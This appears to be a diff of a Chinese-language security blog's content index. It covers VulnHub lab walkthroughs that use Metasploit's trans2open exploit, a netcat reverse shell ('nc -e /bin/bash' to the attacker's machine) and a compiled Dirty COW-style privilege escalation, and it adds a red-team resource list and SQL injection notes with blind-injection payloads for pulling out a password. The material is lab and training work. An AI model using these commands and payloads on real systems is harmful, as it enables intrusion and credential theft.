-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use 0</span><br><span class="line">set payload generic/shell_reverse_tcp</span><br><span class="line">show options</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use 0</span><br><span class="line">set payload generic/shell_reverse_tcp</span><br><span class="line">show options</span><br></pre></td></tr></table></figure></div>
 <p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1ZxTPzqp.png" alt="image"><br><br></p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.0.10</span><br><span class="line">set URI /</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.0.10</span><br><span class="line">set URI /</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
 <p>set URI / 的含義是將模塊的 URI 選項設置為 /。具體而言，用於指定攻擊目標的URI（Uniform Resource Identifier），即指定攻擊目標的路徑或位置。這很重要。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/S1SLTDMq6.png" alt="image"><br><br></p>
 <p>使用<code>id</code>查看身分。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJl00wGca.png" alt="image"><br><br><br><br></p>
 <h2 id="步驟三、另闢蹊徑取得權限"><a href="#步驟三、另闢蹊徑取得權限" class="headerlink" title="步驟三、另闢蹊徑取得權限"></a>步驟三、另闢蹊徑取得權限</h2><p><code>uname -a</code>得到系統 Linux Kernel 版本<code>2.6.24</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HJqQZOG5T.png" alt="image"></p>
@@ -359,26 +416,18 @@
 <p><code>python3 -m http.server</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1EkSOf9T.png" alt="image"><br><br><br><br></p>
 <h2 id="步驟四、建立連線"><a href="#步驟四、建立連線" class="headerlink" title="步驟四、建立連線"></a>步驟四、建立連線</h2><p>發現其shell跳不到/tmp。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyowL_zqT.png" alt="image"></p>
 <p>開啟另一個shell。<code>sudo nc -nlvp 6666</code>。開啟監聽。<br>在原本Shell輸入<code>nc -e /bin/bash 192.168.0.8 6666</code>與另一個shell建立連線。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryNQuOzcT.png" alt="image"><br><br></p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure></div>
 <p><code>python -c</code>：啟動 Python 解釋器並運行指定的 Python 代碼。<br><code>'import pty;pty.spawn("/bin/bash")'</code>：這是一個簡短的 Python 腳本，其中 import pty 導入 pty 模塊，而 pty.spawn(“/bin/bash”) 則啟動一個交互式的 Bash shell。這個 Python 命令使用 pty 模塊在 Linux 系統中生成一個交互式的 Bash shell。通過執行這條命令，你可以將一個非交互式的 shell 提升為交互式，方便進行進一步的操作。這樣的技巧通常在渗透測試和安全測試中使用，但應僅在合法且得到授權的環境中進行。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyMTd_zc6.png" alt="image"></p>
 <p><code>wget http://192.168.0.8:8000/40839.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Sk14q_Gqa.png" alt="image"><br><br><br><br></p>
 <h2 id="步驟五、漏洞內容"><a href="#步驟五、漏洞內容" class="headerlink" title="步驟五、漏洞內容"></a>步驟五、漏洞內容</h2><p>裡面有使用教學。<code>cat 40839.c</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1M0qOf5p.png" alt="image"></p>
 <p>按照其敘述。</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40839.c -o try -lcrypt</span><br><span class="line">ls -alh</span><br><span class="line">./try</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40839.c -o try -lcrypt</span><br><span class="line">ls -alh</span><br><span class="line">./try</span><br></pre></td></tr></table></figure></div>
 <p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/Bk6w6dG9p.png" alt="image"><br><br><br><br></p>
-<h2 id="步驟六、取得權限"><a href="#步驟六、取得權限" class="headerlink" title="步驟六、取得權限"></a>步驟六、取得權限</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">su - firefart</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">輸入密碼</span></span><br><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
+<h2 id="步驟六、取得權限"><a href="#步驟六、取得權限" class="headerlink" title="步驟六、取得權限"></a>步驟六、取得權限</h2><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">su - firefart</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">輸入密碼</span></span><br><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
 <p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJyDAOM9a.png" alt="image"></p>
 ]]></content>
       <tags>
         <tag>VulnHub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>picoCTF</title>
-    <url>/2024/11/30/picoCTF/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
-      <tags>
-        <tag>picoCTF</tag>
       </tags>
   </entry>
   <entry>
@@ -407,10 +456,10 @@
     
 <h2 id="步驟二、尋找漏洞"><a href="#步驟二、尋找漏洞" class="headerlink" title="步驟二、尋找漏洞"></a>步驟二、尋找漏洞</h2><p>Metasploit 框架是一個功能豐富的開源渗透測試框架，其中的 msfconsole 是其<br>主要命令行界面，提供了一個互動式的控制台，用於進行漏洞測試和攻擊模擬。</p>
 <ol>
-<li>探索漏洞：<br>使用 <code>search</code> 指令來搜尋 Metasploit 框架中的漏洞模組。例如，你可以輸入以下指令搜尋特定漏洞： <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">search &lt;漏洞名稱&gt;</span><br></pre></td></tr></table></figure></div></li>
-<li>選擇攻擊模組：<br>使用 use 指令來選擇要使用的攻擊模組。一旦你找到了想要利用的漏洞模組，可以使用以下指令： <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use &lt;模組名稱&gt;</span><br></pre></td></tr></table></figure></div></li>
-<li>設定攻擊模組參數：<br>使用 set 指令來設定攻擊模組的相關參數，以便定制攻擊的目標和方式。例如： <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set &lt;參數名稱&gt; &lt;值&gt;</span><br></pre></td></tr></table></figure></div></li>
-<li>執行攻擊：<br>最後，使用 exploit 指令來執行選擇的攻擊模組，觸發相應的攻擊。這將開始模擬或實際執行渗透測試。 <div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></div></li>
+<li>探索漏洞：<br>使用 <code>search</code> 指令來搜尋 Metasploit 框架中的漏洞模組。例如，你可以輸入以下指令搜尋特定漏洞： <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">search &lt;漏洞名稱&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li>選擇攻擊模組：<br>使用 use 指令來選擇要使用的攻擊模組。一旦你找到了想要利用的漏洞模組，可以使用以下指令： <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">use &lt;模組名稱&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li>設定攻擊模組參數：<br>使用 set 指令來設定攻擊模組的相關參數，以便定制攻擊的目標和方式。例如： <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set &lt;參數名稱&gt; &lt;值&gt;</span><br></pre></td></tr></table></figure></div></li>
+<li>執行攻擊：<br>最後，使用 exploit 指令來執行選擇的攻擊模組，觸發相應的攻擊。這將開始模擬或實際執行渗透測試。 <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></div></li>
 </ol>
 <br>
 <br>
@@ -418,19 +467,30 @@
 <p><code>139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</code> 很可疑。<br>smbd 是 Samba 軟體套件中的一個核心組件，是 Samba Daemon 的縮寫。Samba 是一個開源的軟體套件，提供了與 Microsoft Windows 互通的 SMB/CIFS 協定的實現。Samba 允許非 Windows 系統（例如 Linux、Unix）與 Windows 系統共享檔案、印表機和其他資源。smbd 是 Samba 中負責實現 SMB（Server Message Block）協定的守護進程，它允許其他機器通過 SMB/CIFS 協定訪問和共享資源。這使得 Linux/Unix 系統能夠擔任文件伺服器，與 Windows 系統協同工作，共享檔案和資源。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/r1ack4FY6.png" alt="image"><br><br><br>使用 msfconsole 查看。<code>sudo msfconsole</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByKQyEKFp.png" alt="image"><br><br><br>查看<code>search smb_version</code>。使用<code>use 0</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rJ7BgNYFT.png" alt="image"><br><br><br><code> options</code>。<br>在 Metasploit 框架中，options 是一個用於查看和配置模組（payload、exploit、auxiliary 等）參數的指令。這個指令允許你檢視目前模組的參數配置狀態，以及進行必要的修改。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BJHFbEFta.png" alt="image"><br><br><br>設置<code>RHOSTS</code>參數為<code>192.169.1.104</code>。<br><code>set RHOSTS 192.168.1.104</code>。再<code>show options</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SkDkfVttT.png" alt="image"><br><br><br><code>exploit</code>。得到smba版本<code>Samba 2.2.1a</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ryKvG4KYp.png" alt="image"><br><br></p>
 <h2 id="步驟三、查找漏洞版本問題"><a href="#步驟三、查找漏洞版本問題" class="headerlink" title="步驟三、查找漏洞版本問題"></a>步驟三、查找漏洞版本問題</h2><p>Google <code>Samba 2.2.1a</code>在msfconsole上<a class="link" href="https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/linux/samba/trans2open">應用<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/rySDQEYFp.png" alt="image"></p>
 <p>找到使用<code>trans2open</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/ByXQSwtt6.png" alt="image"></p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">search trans2open</span><br><span class="line">use 1</span><br><span class="line">show options</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">search trans2open</span><br><span class="line">use 1</span><br><span class="line">show options</span><br></pre></td></tr></table></figure></div>
 <p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/H1k4IvKFa.png" alt="image"></p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.1.104</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.1.104</span><br></pre></td></tr></table></figure></div>
 <p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/B1La8wKYT.png" alt="image"></p>
 <p><code>exploit</code>。<br><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/BkgfwDtYa.png" alt="image"><br><br></p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set payload generic/shell_reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">set payload generic/shell_reverse_tcp</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></div>
 <p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/HyThuwKFa.png" alt="image"><br>對於 generic/shell_reverse_tcp 這樣的 payload，它是一個反向 shell 載荷，通常設計成能夠與目標系統建立反向的 TCP 連接，以提供互動式的 shell 會話。generic 的使用表示這個 payload 將根據攻擊環境的具體情況進行一些通用的調整，以確保它在不同情境下的兼容性。<br><br></p>
-<h2 id="步驟四、驗證身分"><a href="#步驟四、驗證身分" class="headerlink" title="步驟四、驗證身分"></a>步驟四、驗證身分</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
+<h2 id="步驟四、驗證身分"><a href="#步驟四、驗證身分" class="headerlink" title="步驟四、驗證身分"></a>步驟四、驗證身分</h2><div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">id</span><br></pre></td></tr></table></figure></div>
 
 <p><img lazyload="" src="/images/loading.svg" data-src="https://hackmd.io/_uploads/SyFKOPtKp.png" alt="image"></p>
 ]]></content>
       <tags>
         <tag>VulnHub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PortSwigger</title>
+    <url>/2024/12/03/PortSwigger/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
+<li><a href="../SQL-injection">SQL-injection</a></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>PortSwigger</tag>
       </tags>
   </entry>
   <entry>
@@ -450,6 +510,401 @@
 ]]></content>
       <tags>
         <tag>VulnHub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Red Team</title>
+    <url>/2024/12/08/Red-Team/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h4 id="1-專注於滲透測試和攻擊腳本的資源"><a href="#1-專注於滲透測試和攻擊腳本的資源" class="headerlink" title="1. 專注於滲透測試和攻擊腳本的資源"></a><strong>1. 專注於滲透測試和攻擊腳本的資源</strong></h4><h5 id="1-Exploit-Database-Exploit-DB"><a href="#1-Exploit-Database-Exploit-DB" class="headerlink" title="(1) Exploit Database (Exploit-DB)"></a><strong>(1) <a class="link"   href="https://www.exploit-db.com/" >Exploit Database (Exploit-DB)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><h5 id="2-GitHub"><a href="#2-GitHub" class="headerlink" title="(2) GitHub"></a><strong>(2) <a class="link"   href="https://github.com/" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Search: <code>red team scripts</code>、<code>offensive security</code>、<code>post exploitation</code> </p>
+<hr>
+<h4 id="2-專注於紅隊技術的資源"><a href="#2-專注於紅隊技術的資源" class="headerlink" title="2. 專注於紅隊技術的資源"></a><strong>2. 專注於紅隊技術的資源</strong></h4><h5 id="1-Red-Team-Academy"><a href="#1-Red-Team-Academy" class="headerlink" title="(1) Red Team Academy"></a><strong>(1) <a class="link"   href="https://www.redteamacademy.com/" >Red Team Academy<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>專注於紅隊技術學習，提供完整的紅隊作業流程，包括社交工程和後滲透技術等。這些內容幫助學習者根據目標環境設計定制化的攻擊劇本，以及進行紅隊任務中的腳本化自動化操作。</p>
+<h5 id="2-PayloadsAllTheThings"><a href="#2-PayloadsAllTheThings" class="headerlink" title="(2) PayloadsAllTheThings"></a><strong>(2) <a class="link"   href="https://github.com/swisskyrepo/PayloadsAllTheThings" >PayloadsAllTheThings<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>這是一個專注於各種攻擊向量的 GitHub 資源庫，包括 SQL Injection、XSS、SSRF 等攻擊場景。它提供了豐富的 Payload 示例，幫助學習者將這些 Payload 整合到自己的攻擊腳本中，並應用於多種場景。</p>
+<h5 id="3-TrustedSec-Blog"><a href="#3-TrustedSec-Blog" class="headerlink" title="(3) TrustedSec Blog"></a><strong>(3) <a class="link"   href="https://www.trustedsec.com/blog/" >TrustedSec Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>TrustedSec 提供最新的紅隊工具與技術分析，分享實際攻擊場景的案例研究。透過這些資源，學習者能更有效地在紅隊演練中應用工具與腳本。</p>
+<h5 id="4-dmcxblue"><a href="#4-dmcxblue" class="headerlink" title="(4) dmcxblue"></a><strong>(4) <a class="link"   href="https://dmcxblue.net/" >dmcxblue<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>dmcxblue 提供紅隊技術相關的文章和研究，涵蓋多種進階攻擊技術和工具的使用。特別適合想了解攻擊理論和實踐的學習者。</p>
+<hr>
+<h4 id="3-模擬演練和學習攻擊腳本的平台"><a href="#3-模擬演練和學習攻擊腳本的平台" class="headerlink" title="3. 模擬演練和學習攻擊腳本的平台"></a><strong>3. 模擬演練和學習攻擊腳本的平台</strong></h4><h5 id="1-Hack-The-Box"><a href="#1-Hack-The-Box" class="headerlink" title="(1) Hack The Box"></a><strong>(1) <a class="link"   href="https://www.hackthebox.com/" >Hack The Box<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Hack The Box 提供一個互動學習平台，專注於紅隊與藍隊的模擬攻擊場景，適合學習如何在實際演練中使用攻擊腳本。它涵蓋從基礎到高級的滲透測試挑戰，幫助學習者針對不同場景進行腳本開發與應用。</p>
+<h5 id="2-VulnHub"><a href="#2-VulnHub" class="headerlink" title="(2) VulnHub"></a><strong>(2) <a class="link"   href="https://www.vulnhub.com/" >VulnHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>VulnHub 提供可下載的靶機映像，讓學習者可以在本地虛擬環境中進行滲透測試演練，從而提升實戰能力。涵蓋多種難度和場景，適合從初學者到高級使用者。</p>
+<h5 id="3-TryHackMe"><a href="#3-TryHackMe" class="headerlink" title="(3) TryHackMe"></a><strong>(3) <a class="link"   href="https://tryhackme.com/" >TryHackMe<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>TryHackMe 提供專門的腳本化攻擊課程，包括 CTF 和專業紅隊技能訓練環境，幫助學習者從基礎腳本開發到複雜攻擊劇本的實踐操作，並結合 <code>pwntools</code> 等工具進行實作。</p>
+<h5 id="4-RangeForce"><a href="#4-RangeForce" class="headerlink" title="(4) RangeForce"></a><strong>(4) <a class="link"   href="https://www.rangeforce.com/" >RangeForce<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>RangeForce 模擬企業場域的防禦與攻擊演練，針對紅隊演練特性提供深度學習環境。學習者可以在此學習如何應對企業防禦措施，並開發和調整針對實際場域的攻擊腳本。</p>
+<h5 id="5-BloodHound"><a href="#5-BloodHound" class="headerlink" title="(5) BloodHound"></a><strong>(5) <a class="link"   href="https://bloodhound.readthedocs.io/" >BloodHound<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>BloodHound 是一個用於內網環境分析的工具，特別針對 Active Directory（AD）環境進行攻擊路徑探索與分析，幫助學習者設計內網滲透策略。</p>
+<hr>
+<h4 id="4-特定工具與框架學習資源"><a href="#4-特定工具與框架學習資源" class="headerlink" title="4. 特定工具與框架學習資源"></a><strong>4. 特定工具與框架學習資源</strong></h4><h5 id="1-Cobalt-Strike-Documentation"><a href="#1-Cobalt-Strike-Documentation" class="headerlink" title="(1) Cobalt Strike Documentation"></a><strong>(1) <a class="link"   href="https://www.cobaltstrike.com/support/user-manuals" >Cobalt Strike Documentation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>提供詳細的 Cobalt Strike 使用指南，特別是 Aggressor Scripts 的編寫與應用教學。這幫助學習者了解攻擊腳本的開發流程，並結合現有工具實現任務的自動化腳本設計。</p>
+<h5 id="2-Metasploit-Unleashed"><a href="#2-Metasploit-Unleashed" class="headerlink" title="(2) Metasploit Unleashed"></a><strong>(2) <a class="link"   href="https://www.offensive-security.com/metasploit-unleashed/" >Metasploit Unleashed<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Metasploit 的官方教學，涵蓋腳本模組的開發與應用。學習者可以透過這些內容掌握如何根據需求設計自定義攻擊腳本，以及熟悉 Metasploit 框架的腳本化操作流程。</p>
+<h5 id="3-MITRE-ATT-CK-Framework"><a href="#3-MITRE-ATT-CK-Framework" class="headerlink" title="(3) MITRE ATT&amp;CK Framework"></a><strong>(3) <a class="link"   href="https://attack.mitre.org/" >MITRE ATT&amp;CK Framework<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>提供標準化的攻擊技術與場景資料庫，幫助學習者模擬 ATT&amp;CK 技術腳本的實現，並設計符合紅隊演練場景的攻擊腳本。</p>
+<h5 id="4-Empire"><a href="#4-Empire" class="headerlink" title="(4) Empire"></a><strong>(4) <a class="link"   href="https://github.com/BC-SECURITY/Empire" >Empire<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Empire 是一個強大的後滲透測試框架，支持腳本化的滲透測試活動，適合進行模擬攻擊與自動化操作。</p>
+<h5 id="5-MITRE-Caldera"><a href="#5-MITRE-Caldera" class="headerlink" title="(5) MITRE Caldera"></a><strong>(5) <a class="link"   href="https://caldera.mitre.org/" >MITRE Caldera<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>MITRE Caldera 是一個自動化紅隊模擬框架，專注於模擬真實的攻擊行為，幫助學習者測試與了解各種攻擊技術。適合用於模擬企業場域的攻擊活動。</p>
+<h5 id="6-Atomic-Red-Team"><a href="#6-Atomic-Red-Team" class="headerlink" title="(6) Atomic Red Team"></a><strong>(6) <a class="link"   href="https://github.com/redcanaryco/atomic-red-team" >Atomic Red Team<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></h5><p>Atomic Red Team 提供一組開放式的攻擊技術測試框架，幫助學習者快速測試與模擬常見的攻擊技巧，並結合 MITRE ATT&amp;CK 進行實踐。</p>
+]]></content>
+      <tags>
+        <tag>other</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL injection</title>
+    <url>/2024/12/03/SQL-injection/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
+<li><a class="link"   href="https://portswigger.net/web-security/all-labs" >All labs<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a href="https://portswigger.net/web-security/sql-injection"><em>SQL Injection</em></a></li>
+<li><a class="link"   href="https://portswigger.net/web-security/sql-injection/cheat-sheet" >SQL injection cheat sheet<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ul>
+<br>
+<br>
+
+<h4 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h4><div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products  <span class="comment">--從 products 表格中選取所有欄位</span></span><br><span class="line"><span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="comment">--篩選 category 欄位值為 &#x27;Gifts&#x27; 的記錄</span></span><br><span class="line"><span class="keyword">AND</span> released <span class="operator">=</span> <span class="number">1</span> <span class="comment">--進一步篩選 released 欄位值為 1 的記錄</span></span><br></pre></td></tr></table></figure></div>
+<br>
+<br>
+
+<ul>
+<li><code>UPDATE</code> ：用於設定更新值或 WHERE 條件</li>
+<li><code>INSERT</code> ：用於設定要插入的值</li>
+<li><code>SELECT</code> ：用於指定表格或欄位名稱</li>
+<li><code>ORDER BY</code> ：用於排序條件</li>
+</ul>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="comment">-- 選取所有欄位</span></span><br><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> <span class="operator">*</span> <span class="operator">=</span> <span class="keyword">NULL</span> <span class="comment">-- 將所有欄位設為 NULL</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users <span class="keyword">VALUES</span> (<span class="operator">*</span>) <span class="comment">-- 插入所有欄位的值</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="operator">*</span> <span class="comment">-- 按所有欄位排序</span></span><br></pre></td></tr></table></figure></div>
+
+<p><br><br></p>
+<p>SQL injection examples</p>
+<ul>
+<li>Retrieving hidden data</li>
+<li>Subverting application logic</li>
+<li>UNION attacks<ul>
+<li>Determining the number of columns</li>
+<li>Finding columns with a useful data type</li>
+<li>Retrieving interesting data</li>
+<li>Retrieving multiple values in a single column</li>
+</ul>
+</li>
+<li>Blind SQL injection<ul>
+<li>What is blind SQL injection?</li>
+<li>Triggering conditional responses</li>
+<li>Error-based SQL injection</li>
+<li>Triggering time delays</li>
+<li>Out-of-band (OAST) techniques</li>
+<li>Preventing blind SQL injection</li>
+</ul>
+</li>
+</ul>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</span></span><br><span class="line"><span class="keyword">SELECT</span> TrackingId <span class="keyword">FROM</span> TrackedUsers <span class="keyword">WHERE</span> TrackingId <span class="operator">=</span> <span class="string">&#x27;u5YD3PapBcR4lN3e7Tj4&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- …xyz&#x27; AND &#x27;1&#x27;=&#x27;1</span></span><br><span class="line">xyz<span class="string">&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;</span>Administrator<span class="string">&#x27;), 1, 1) &gt; &#x27;</span>m</span><br><span class="line">xyz<span class="string">&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;</span>Administrator<span class="string">&#x27;), 1, 1) = &#x27;</span>s</span><br></pre></td></tr></table></figure></div>
+
+
+<p><br><br><br><br><br></p>
+<p>Examining the database</p>
+<ul>
+<li>Querying the type and version</li>
+<li>Listing the contents</li>
+</ul>
+<p><br><br></p>
+<p>How to prevent SQL injection</p>
+<ul>
+<li>Whitelisting permitted input values.</li>
+<li>Using different logic to deliver the required behavior.</li>
+</ul>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- The user input is concatenated directly into the query.</span></span><br><span class="line">String query <span class="operator">=</span> &quot;SELECT * FROM products WHERE category = &#x27;&quot;<span class="operator">+</span> input <span class="operator">+</span> &quot;&#x27;&quot;; </span><br><span class="line">Statement statement <span class="operator">=</span> connection.createStatement();</span><br><span class="line">ResultSet resultSet <span class="operator">=</span> statement.executeQuery(query);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- This code in a way that prevents the user input from interfering with the query structure.</span></span><br><span class="line">PreparedStatement statement <span class="operator">=</span> connection.prepareStatement(&quot;SELECT * FROM products WHERE category = ?&quot;);</span><br><span class="line">statement.setString(<span class="number">1</span>, input);</span><br><span class="line">ResultSet resultSet <span 